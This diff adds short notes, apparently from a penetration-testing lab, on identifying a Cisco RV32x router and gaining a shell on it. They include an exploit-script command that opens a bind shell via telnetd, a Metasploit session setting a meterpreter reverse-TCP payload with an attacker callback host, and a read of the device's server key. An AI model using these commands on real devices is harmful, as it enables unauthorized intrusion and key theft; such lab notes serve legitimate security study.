@@ -1,0 +1,37 @@
+nmap is not definitive 
+
+curl provides "cisco" and "router" but not model
+
+google:
+	cisco router dropbear 2014.65 apache httpd nginx 1.10.1
+
+	nearly first hit is Cisco RV32x Routers
+
+
+CiscoRV320Dump
+
+$ python easy_access.py -t x.x.x.x -p 8443 -s -c "telnetd -l /bin/sh -p 1337"
+
+
+
+
+Metasploit
+
+
+[*] 10.11.0.2 - Meterpreter session 1 closed.  Reason: Died
+msf6 exploit(linux/http/cisco_rv32x_rce) > use exploit/linux/http/cisco_rv32x_rce
+[*] Using configured payload linux/mips64/meterpreter_reverse_tcp
+msf6 exploit(linux/http/cisco_rv32x_rce) > set payload  payload/linux/mips64/meterpreter_reverse_tcp
+payload => linux/mips64/meterpreter_reverse_tcp
+msf6 exploit(linux/http/cisco_rv32x_rce) > set LHOST 10.11.0.97
+LHOST => 10.11.0.97
+msf6 exploit(linux/http/cisco_rv32x_rce) > set RHOSTS 10.11.0.2
+RHOSTS => 10.11.0.2
+msf6 exploit(linux/http/cisco_rv32x_rce) > set AutoLoadStdapi true
+AutoLoadStdapi => true
+msf6 exploit(linux/http/cisco_rv32x_rce) > run
+
+
+md5sum /usr/local/EasyAccess/var/cert/server.key
+e8531b891c94fc9ce5cb264fe40397c2  /usr/local/EasyAccess/var/cert/server.key
+
